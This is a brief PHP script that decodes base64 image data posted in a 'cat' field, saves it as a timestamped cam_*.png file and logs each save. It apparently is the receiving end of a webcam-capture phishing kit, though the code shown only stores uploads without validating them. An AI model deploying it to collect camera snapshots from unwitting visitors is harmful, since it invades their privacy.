<?php
$date = date('dMYHis');
if (!empty($_POST['cat'])) {
    $filteredData = substr($_POST['cat'], strpos($_POST['cat'], ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = 'cam_' . $date . '.png';
    file_put_contents($filename, $unencodedData);
    error_log("Camera saved: " . $filename . "\r\n", 3, "camera_log.txt");
}
exit();
?>
